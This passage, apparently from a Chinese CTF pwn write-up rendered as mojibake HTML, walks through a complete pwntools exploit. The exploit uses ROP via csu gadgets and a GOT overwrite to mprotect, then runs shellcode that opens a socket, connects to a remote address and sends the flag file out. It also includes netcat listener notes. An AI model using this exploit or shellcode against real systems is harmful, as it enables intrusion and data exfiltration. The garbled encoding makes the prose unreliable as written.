rdiçš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™å›ç¨‹åºè¿™ä¹ˆå†™å°±ä¼šç›´æ¥å´©æºƒï¼Œä¸è¿‡å¥½åœ¨æº¢å‡ºå¡çš„ä¸æ­»ï¼Œä¹Ÿä¸å·®è¿™å‡ ä¸ªå­—èŠ‚</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#read(1,0x601500,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi,0x601500</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#write(0,0x601500,0x50)</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi,0x601500</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>æŠŠä¸Šè¿°shellcodeå…¨éƒ¨è½¬æˆæœºå™¨ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socket=&quot;\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05&quot;</span><br><span class="line"></span><br><span class="line">connect=&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span><br><span class="line"></span><br><span class="line">orw=&quot;\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span><br></pre></td></tr></table></figure><p>æœ€åçš„payloadæ‰§è¡Œä¸‹repæŒ‡ä»¤å†å¸ƒç½®ä¸‹shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr+<span class="number">0x50</span>)<span class="comment">#æŠŠshellcodeå¸ƒç½®åˆ°bss_addråŠ 0x50çš„åœ°æ–¹</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#æŠŠrspçš„å€¼ç»™rsiï¼Œä¹Ÿå°±æ˜¯è¯´rsiå€¼ä¸ºä¸‹é¢è¿™ä¸ªbss_addræ‰€å¯¹åº”çš„æ ˆåœ°å€</span></span><br><span class="line">payload+=p64(bss_addr)<span class="comment">#æ‰§è¡ŒrepæŒ‡ä»¤ï¼Œè‡³æ­¤æ‹·è´å¼€å§‹</span></span><br></pre></td></tr></table></figure><p>æœ€åå†å›ç­”ä¸€ä¸‹å½“æ—¶é—®çš„æ€ä¹ˆå°†æ‰§è¡ŒæµåŠ«æŒåˆ°bssæ®µä¸Šã€‚</p><p>é€šè¿‡è°ƒè¯•å‘ç°ï¼Œæ‹·è´çš„æ—¶å€™åªæœ‰rsiå’Œrdiåœ¨ç§»åŠ¨ï¼Œè€Œrspå§‹ç»ˆæ²¡æœ‰å˜ï¼Œå› æ­¤æˆ‘åªéœ€è¦åœ¨å‘é€shellcodeä¹‹å‰æ”¾ä¸€ä¸ªbssæ®µåœ°å€ï¼ˆè¿™ä¸ªåœ°å€è¦æ‰§è¡Œshellcodeçš„é¦–åœ°å€ï¼‰ï¼Œåœ¨payloadçš„æœ€ååŠ ä¸Šä¸€ä¸ªretå³å¯å®ŒæˆåŠ«æŒæ‰§è¡Œæµã€‚</p><p><img src="/../img/2706180-20220426103703621-1232925873.png"></p><h1 id="å®Œæ•´expï¼š"><a href="#å®Œæ•´expï¼š" class="headerlink" title="å®Œæ•´expï¼š"></a>å®Œæ•´expï¼š</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;47.97.127.1&quot;,26417)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr=<span class="number">0x4004e6</span></span><br><span class="line">magic_gadget_addr=<span class="number">0x400618</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400903</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x400901</span></span><br><span class="line">rdx_offset=<span class="number">0x1b96</span></span><br><span class="line">mprotect_offset=<span class="number">0x11b7e0</span></span><br><span class="line">alarm_offset=<span class="number">0xe44f0</span></span><br><span class="line">close_offset=<span class="number">0x110870</span></span><br><span class="line">prctl_offset=<span class="number">0x122210</span></span><br><span class="line">read_offset=<span class="number">0x110020</span></span><br><span class="line">csu_gadget1=<span class="number">0x4008FA</span></span><br><span class="line">csu_gadget2=<span class="number">0x4008E0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400645</span></span><br><span class="line">term_hook=<span class="number">0x600e48</span></span><br><span class="line">alarm_got_addr=e.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_plt_addr=e.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">prctl_got_addr=e.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">prctl_plt_addr=e.plt[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">close_got_addr=e.got[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">close_plt_addr=e.plt[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rax_offset=<span class="number">0x24ad4</span></span><br><span class="line">pop_rdx_offset=<span class="number">0x1b96</span></span><br><span class="line">rep_offset=<span class="number">0x3f84a</span></span><br><span class="line">bss_addr=<span class="number">0x601100</span></span><br><span class="line">bss_ye=<span class="number">0x601000</span></span><br><span class="line">mov_rdi_rsp_offset=<span class="number">0x15c2fe</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket(2,1,0)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">psuh 0</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 41</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">socket=<span class="string">&quot;\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#connect(0,socket_struct_addr,0x8)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rcx,0x13589c5282230002</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 0x10</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 42</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="comment">#connect=&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x23\x82\x52\x9C\x58\x13\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#local</span></span><br><span class="line">connect=<span class="string">&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line"><span class="comment">#read(1,0x601500,0x50)</span></span><br><span class="line"><span class="comment">#write(0,0x601500,0x50)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rsi,0x601500</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rsi,0x601500</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#mov rsi,0x601500</span></span><br><span class="line">orw=<span class="string">&quot;\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ä¸‹é¢ä¸‰ä¸ªæŒ‡ä»¤æ‰€å¯¹åº”çš„æœºå™¨ç </span></span><br><span class="line"><span class="string">rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3</span></span><br><span class="line"><span class="string">mov rsi,rsp;ret #4889E6C3</span></span><br><span class="line"><span class="string">pop rbx;pop rbp;pop rcx #5B5D59C3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†alarmå‡½æ•°çš„gotè¡¨æ¢æˆmprotectçš„çœŸå®åœ°å€</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(mprotect_offset-alarm_offset)+p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œmprotectå‡½æ•°</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(alarm_got_addr)</span><br><span class="line">payload+=p64(bss_ye)</span><br><span class="line">payload+=p64(<span class="number">0x100000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¾€bssæ®µ+0x10å†™å…¥pop rbx;pop rbp;pop rcx;ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xc3595d5b</span>)+p64(bss_addr+<span class="number">0x10</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#å¾€bssæ®µå†™å…¥ rep movs qword ptr [rdi],qword ptr[rsi] ; ret</span></span><br><span class="line"><span class="comment">#payload+=p64(bss_addr+0x10)</span></span><br><span class="line">payload+=p64(<span class="number">0xc3a548f3</span>)+p64(bss_addr+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¾€bssæ®µ+0x8å†™å…¥mov rsi,rsp;ret</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xc3e68948</span>)+p64(bss_addr+<span class="number">0x8</span>+<span class="number">0x3d</span>)+p64(<span class="number">15</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡ŒrepæŒ‡ä»¤</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr+<span class="number">0x50</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=socket+connect+orw</span><br><span class="line">payload+=p64(ret_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;shellcode_length----------&gt;&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(socket+connect+orw)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;payload_length------------&gt;&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220426103751910-1556922758.png"></p><h1 id="è¡¥å……ï¼š"><a href="#è¡¥å……ï¼š" class="headerlink" title="è¡¥å……ï¼š"></a>è¡¥å……ï¼š</h1><h2 id="å…³äºsocketå’Œconnectçš„å‚æ•°"><a href="#å…³äºsocketå’Œconnectçš„å‚æ•°" class="headerlink" title="å…³äºsocketå’Œconnectçš„å‚æ•°"></a>å…³äºsocketå’Œconnectçš„å‚æ•°</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åœ°å€æ—ï¼Œä¹Ÿå°±æ˜¯IPåœ°å€çš„ç±»å‹ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°æ®çš„ä¼ è¾“æ–¹å¼ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯é‡‡ç”¨çš„ä¼ è¾“åè®®</p><p>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæˆ‘ä»¬æœ€åå‚æ•°é‡‡ç”¨çš„åˆ†åˆ«æ˜¯2,1,0 å³ipv6ï¼Œé¢å‘è¿æ¥çš„å¥—æ¥å­—ï¼ŒTCPä¼ è¾“åè®®</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr,<span class="type">socklen_t</span> addrlen)</span>;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯socketå‡½æ•°è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯sockaddrç»“æ„ä½“çš„åœ°å€ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯sockaddrçš„ç»“æ„ä½“å¤§å°</p><p>ç¬¬ä¸€ä¸ªå‚æ•°æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç¬¬äºŒä¸ªå°±å¾ˆæœ‰è®²ç©¶äº†ï¼Œä»€ä¹ˆæ˜¯sockaddrç»“æ„ä½“ï¼Ÿä¸çŸ¥é“è¿™ä¸ªæ€ä¹ˆå†™payloadï¼Ÿç¿»ä¸€ä¸‹glibcæºç ï¼ˆè¿™ä¸ªsockaddrç»“æ„ä½“ä½äºsocket.hè¿™ä¸ªæ–‡ä»¶ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    __SOCKADDR_COMMON (sa_);        <span class="comment">/* Common data: address family and length.  */</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>];                <span class="comment">/* Address data.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæˆå‘˜æ”¾çš„æ˜¯åœ°å€æ—ï¼Œç¬¬äºŒä¸ªæˆå‘˜æ”¾çš„æ˜¯ipåœ°å€åŠ ç«¯å£ï¼ˆè¿™é‡Œè¦æŠŠipåœ°å€å’Œç«¯å£è½¬æ¢æˆåå…­è¿›åˆ¶ä»¥å°ç«¯åºå‘é€ï¼ˆå‚è€ƒå¦‚ä¸‹ï¼‰</p><p>ä»¥è½¬æ¢127.0.0.1 1000ä¸ºä¾‹</p><p>åˆ†åˆ«æŠŠ127 0 0 1 1000è½¬æ¢æˆ16è¿›åˆ¶7F 00 00 01 03e8ï¼Œç„¶åååºæ’åˆ—ä¸º0100007F03e8ï¼ˆ<strong>å› ä¸ºp64æ‰“åŒ…ä¼šä½¿ipåœ°å€å’Œç«¯å£ä»¥å°ç«¯åºæ’åˆ—ï¼Œè€Œæœ€åä½¿ç”¨çš„æ—¶å€™åˆè¦ä½¿ç”¨æ­£åºçš„ipåœ°å€å’Œç«¯å£ï¼Œå› æ­¤æˆ‘ä»¬å…ˆå°†å…¶è½¬æ¢ä¸ºååºï¼Œå†ç”¨p64æ‰“åŒ…ï¼Œæœ€åå­˜å‚¨åœ¨sockaddrçš„ç»“æ„ä½“ä¸­çš„æ•°æ®ä¾ç„¶æ˜¯æ­£åºçš„ipå’Œç«¯å£</strong>ï¼‰</p><p>ç¬¬ä¸‰ä¸ªç»“æ„ä½“å°±è‡ªç„¶è€Œç„¶æ˜¯16å­—èŠ‚äº†ï¼ˆå½“æ—¶æœ‰ä¸€ä¸ªå›°æƒ‘çš„ç‚¹å°±æ˜¯å‘é€sockaddrç»“æ„ä½“çš„æ—¶å€™ï¼Œæ˜æ˜åªå†™äº†8å­—èŠ‚ï¼Œä½†è¿™ä¸ªå¤§å°ï¼ˆä¹Ÿå°±æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°ï¼‰éè¦å¡«16å­—èŠ‚ï¼Œçœ‹å®Œæºç ç­”æ¡ˆè‡ªç„¶è€Œè§£ï¼‰</p><h2 id="å…³äºä¸Šæ–‡å‡ºç°é—®é¢˜çš„è§£é‡Šï¼š"><a href="#å…³äºä¸Šæ–‡å‡ºç°é—®é¢˜çš„è§£é‡Šï¼š" class="headerlink" title="å…³äºä¸Šæ–‡å‡ºç°é—®é¢˜çš„è§£é‡Šï¼š"></a>å…³äºä¸Šæ–‡å‡ºç°é—®é¢˜çš„è§£é‡Šï¼š</h2><blockquote><p>å¦‚æœä¿®æ”¹äº†æŸä¸ªå‡½æ•°çš„gotè¡¨ï¼ˆè‡³äºä¿®æ”¹æˆä»€ä¹ˆä¸é‡è¦ï¼‰ï¼Œç°åœ¨æƒ³è¦ä½¿ç”¨è¿™ä¸ªè¢«ä¿®æ”¹çš„gotè¡¨ï¼ˆä¹Ÿå°±æ˜¯è¢«ä¿®æ”¹æˆçš„å†…å®¹ï¼‰ã€‚åˆ°æœ€åæ‰§è¡ŒretæŒ‡ä»¤æ—¶ï¼Œï¼ˆæ ˆé¡¶çš„å†…å®¹ï¼‰åº”è¯¥ç”¨pltåœ°å€æ¥è¡”æ¥ï¼Œè¿˜æ˜¯ç”¨gotåœ°å€æ¥è¡”æ¥ï¼Ÿ</p><p><strong>retæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯pop rip</strong>ï¼Œä¹Ÿå°±æ˜¯æŠŠæ ˆé¡¶çš„å†…å®¹ï¼ˆè¿™é‡Œè¦å°¤å…¶æ³¨æ„ï¼Œæˆ‘å¼ºè°ƒçš„æ˜¯<strong>æ ˆé¡¶çš„å†…å®¹</strong>ï¼‰ç›´æ¥å¼¹ç»™ripï¼Œå¦‚æœè¡”æ¥gotåœ°å€æ˜¯ä»€ä¹ˆæƒ…å†µï¼ŸæŠŠä¸€ä¸ªè·³æ¿æ”¾åˆ°reté‡Œï¼Ÿè¿™ä¸ªè·³æ¿ä»€ä¹ˆéƒ½åšä¸äº†<strong>ï¼Œè·³æ¿ï¼Œé¡¾åæ€ä¹‰ï¼Œåªèƒ½è¢«åˆ«äººè¸©åœ¨ä¸‹é¢è·³åˆ°åˆ«äººæƒ³è·³çš„åœ°å€ï¼Œå®ƒè‡ªèº«æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰</strong>ã€‚</p><p>å¦‚æœæ”¾å…¥pltåœ°å€å‘¢ï¼Ÿæ—¢ç„¶æ˜¯ä¿®æ”¹äº†gotè¡¨ï¼Œä¹Ÿå°±æ˜¯è¯´è‚¯å®šæ˜¯è¿›è¡Œå»¶è¿Ÿç»‘å®šäº†ï¼Œ<strong>æ‰§è¡Œé‚£ä¸ªå‡½æ•°pltè¡¨çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œjmp ptrã€gotåœ°å€ã€‘ï¼Œæ­¤æ—¶å»è·³åˆ°äº†è·³æ¿æŒ‡å‘çš„åœ°æ–¹ï¼ˆä¹Ÿå°±æ˜¯è¢«ä¿®æ”¹çš„gotè¡¨ï¼‰</strong>ï¼Œæ­¤æ—¶æ‰èƒ½å®Œæˆæˆ‘ä»¬æƒ³è¦çš„è¦æ±‚ã€‚</p></blockquote><h2 id="pwntoolsä¸­çš„ä¸€ä¸ªæœªè§£ä¹‹è°œ"><a href="#pwntoolsä¸­çš„ä¸€ä¸ªæœªè§£ä¹‹è°œ" class="headerlink" title="pwntoolsä¸­çš„ä¸€ä¸ªæœªè§£ä¹‹è°œ"></a>pwntoolsä¸­çš„ä¸€ä¸ªæœªè§£ä¹‹è°œ</h2><p>è¿™é‡Œæ˜¯å½“æ—¶è¸©çš„ä¸€ä¸ªå‘ï¼Œè‡³ä»Šæœªèƒ½æ‰¾å‡ºåŸå› ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚</p><p>ä¸Šé¢æåˆ°è¦æ‰¾åˆ°æ— ç”¨å‡½æ•°åœ¨libcä¸­çš„åç§»ï¼Œæˆ‘æœ€å¼€å§‹é‡‡ç”¨çš„æ˜¯è¿™ä¸ªæ–¹æ³•</p><p><img src="/../img/2706180-20220426103817080-960601662.png"></p><p>ä½†æ˜¯å¾—åˆ°çš„closeå‡½æ•°åœ¨libcä¸­çš„åç§»æ˜¯ä¸æ­£ç¡®çš„ï¼Œè¿™ä¸€ç‚¹å¾ˆå¥‡æ€ªã€‚</p><p>è¿™é‡Œæˆ‘è®°å½•ä¸€ä¸‹æ’æŸ¥è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•ã€‚<strong>å…ˆæŸ¥çœ‹ä¸€ä¸‹libcåŸºåœ°å€ï¼Œç„¶åç”¨gdbçœ‹ä¸€ä¸‹closeå»¶è¿Ÿç»‘å®šä¹‹åçš„çœŸå®åœ°å€ï¼ŒäºŒè€…ç›¸å‡çœ‹æ˜¯å¦æ˜¯æ‰“å°å‡ºæ¥çš„closeå‡½æ•°åœ¨libcä¸­çš„åç§»ã€‚æ˜¾ç„¶ç”¨è¿™ä¸ªæ–¹æ³•æµ‹è¯•ä¹‹åçš„åç§»æ˜¯ä¸ä¸€æ ·çš„ã€‚æ­¤æ—¶æ‰æ„è¯†åˆ°ä¸Šå›¾çš„æ–¹æ³•å¹¶ä¸èƒ½æ‰“å°å‡ºæ¥æ­£ç¡®çš„closeåç§»ã€‚</strong></p><p><strong>è§£å†³æ–¹æ³•â‘ ï¼š</strong></p><p>gdbåŠ¨æ€è°ƒè¯•çœ‹ä¸€ä¸‹ï¼Œå®ƒçš„çœŸå®åœ°å€</p><p><img src="/../img/2706180-20220426103846637-587580728.png"></p><p>ç„¶åå†ç”¨gdbçœ‹ä¸‹ï¼Œlibcçš„åŸºåœ°å€</p><p><img src="/../img/2706180-20220426103859734-1715666525.png"></p><p>äºŒè€…ç›¸å‡ï¼Œæ‹¿åˆ°closeåœ¨libcä¸­çš„åç§»</p><p><strong>è§£å†³æ–¹æ³•â‘¡ï¼š</strong></p><p>ä½¿ç”¨å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf --symbols /lib/x86_64-linux-gnu/libc.so.6 | grep &#x27;mprotect&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220426103934059-170044952.png"></p><p>æˆ–è€…</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep &#x27;_close&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220426104003427-537650546.png"></p><p>ä½†æ˜¯ç”¨objdumpæœ‰æ—¶å€™ä¼¼ä¹æœçš„ä¸å¤ªå¯¹ï¼Œåæ­£æœlibcä¸­å‡½æ•°åç§»çš„æ—¶å€™ï¼Œå°½é‡ä½¿ç”¨readelfå‘½ä»¤</p><h2 id="å…³äºæ‰“æœ¬åœ°æ—¶ç›‘å¬ç«¯å£çš„ä¸€ä¸ªå°å‘"><a href="#å…³äºæ‰“æœ¬åœ°æ—¶ç›‘å¬ç«¯å£çš„ä¸€ä¸ªå°å‘" class="headerlink" title="å…³äºæ‰“æœ¬åœ°æ—¶ç›‘å¬ç«¯å£çš„ä¸€ä¸ªå°å‘"></a>å…³äºæ‰“æœ¬åœ°æ—¶ç›‘å¬ç«¯å£çš„ä¸€ä¸ªå°å‘</h2><p>å½“è„šæœ¬å†™å®Œä¹‹åï¼Œè¿è¡Œçš„æ—¶ï¼Œæˆ‘åˆè¸©åˆ°äº†æœ€åä¸€ä¸ªå‘ã€‚</p><p>è¿™ä¸ªè„šæœ¬ç°åœ¨æ˜¯å°†flagçš„æ•°æ®è¯»åˆ°äº†socketä¸Šç„¶åå°†å…¶å‘é€åˆ°connectè¿æ¥åˆ°çš„ç«¯å£ä¸Šï¼Œæˆ‘ä»¬æƒ³æ¥æ”¶è¿™ä¸ªæ•°æ®å°±å¿…é¡»å…ˆç›‘å¬è¿™ä¸ªç«¯å£ï¼Œç„¶åç­‰å¾…æ•°æ®å‘é€è¿‡æ¥ã€‚</p><p><img src="/../img/2706180-20220426102522302-1487885126.png"></p><p>è¿™æ˜¯æˆ‘æœ€å¼€å§‹é‡‡ç”¨çš„nc -l 1000ç›‘å¬çš„æ–¹å¼ï¼Œæ­¤æ—¶æ˜¯æ²¡æœ‰ä»»ä½•æ•°æ®è¿‡æ¥çš„ï¼Œæœ€é‡è¦çš„æ˜¯ï¼Œconnectå‹æ ¹å°±æ²¡æœ‰è¿æ¥åˆ°è¿™ä¸ªç«¯å£ä¸Š(æ¢å¥è¯è¯´æ­¤æ—¶å‹æ ¹éƒ½æ²¡æœ‰ç›‘å¬åˆ°è¿™ä¸ªç«¯å£ï¼‰ï¼Œç»è¿‡ç–¯ç‹‚çš„è°ƒè¯•è§‚å¯Ÿï¼ˆå› ä¸ºåŸæœ¬æ˜¯ä¸çŸ¥é“å“ªçš„é—®é¢˜ï¼Œåªèƒ½ä»è„šæœ¬é‡Œé¢ä¸€ç‚¹ä¸€ç‚¹æŸ¥ï¼‰ä¾æ—§æ²¡æœ‰è§£å†³ï¼Œæœ€åè¯¢é—®å­¦é•¿å‘ç°ï¼Œæ˜¯ç›‘å¬çš„å‚æ•°æœ‰é—®é¢˜ï¼Œä¸‹å»ä¹‹åé€šè¿‡æŸ¥è¯¢ncçš„ä½¿ç”¨æ‰‹å†Œå‘ç°</p><p><img src="/../img/2706180-20220426102531360-796579110.png"></p><p><strong>å‚æ•°lå¼€å¯ç›‘å¬æ¨¡å¼ï¼Œå‚æ•°pæ‰æ˜¯æŒ‡å®šç«¯å£ï¼ˆæˆ‘çš„é—®é¢˜å°±æ˜¯å‹æ 